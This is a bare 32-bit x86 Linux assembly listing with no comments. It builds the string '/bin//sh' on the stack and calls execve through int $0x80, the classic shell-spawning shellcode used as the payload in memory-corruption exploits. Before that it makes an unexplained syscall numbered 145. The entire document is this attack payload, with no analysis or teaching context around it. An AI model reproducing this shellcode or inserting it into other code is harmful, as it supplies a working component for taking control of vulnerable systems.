.globl	main
	.type	main, @function
main:
	movb $145,%al
	xorl %ecx,%ecx
	pushl %ecx
	movl %esp,%ebx
	decl %ebx
	int $0x80

	xorl %eax,%eax
	pushl %eax
	pushl $0x68732f2f
	pushl $0x6e69622f
	movl %esp,%ebx
	pushl %eax
	pushl %ebx
	movl %esp,%ecx
	cdq
	movb $0x0b,%al
	int $0x80
